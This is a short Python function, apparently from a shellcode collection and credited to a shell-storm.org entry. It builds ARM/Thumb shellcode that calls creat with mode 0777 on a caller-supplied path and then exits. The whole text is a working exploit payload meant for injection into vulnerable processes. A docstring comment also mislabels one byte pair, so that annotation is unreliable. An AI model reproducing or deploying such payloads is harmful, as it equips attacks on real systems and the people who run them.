#http://shell-storm.org/shellcode/files/shellcode-854.php
#Author : gunslinger_ (yuda at cr0security dot com)

"""
                  "\x2f\x72\x6f\x6f"    // .word    0x6f6f722f
                  "\x74\x2f\x70\x77"    // .word    0x77702f74
                  "\x65\x63"            // .short   0x656e
                  "\x64";               // .byte    0x64
"""

def creat( path):
	shellcode =  r"\x01\x60\x8f\xe2"   	
	shellcode += r"\x16\xff\x2f\xe1" 	
	shellcode += r"\x78\x46"            	
	shellcode += r"\x10\x30"            	
	shellcode += r"\xff\x21"      	
	shellcode += r"\xff\x31"          	
	shellcode += r"\x01\x31"           	
	shellcode += r"\x08\x27"            	
	shellcode += r"\x01\xdf"            	
	shellcode += r"\x40\x40"      	
	shellcode += r"\x01\x27"          	
	shellcode += r"\x01\xdf"      
	shellcode += path
	return shellcode     	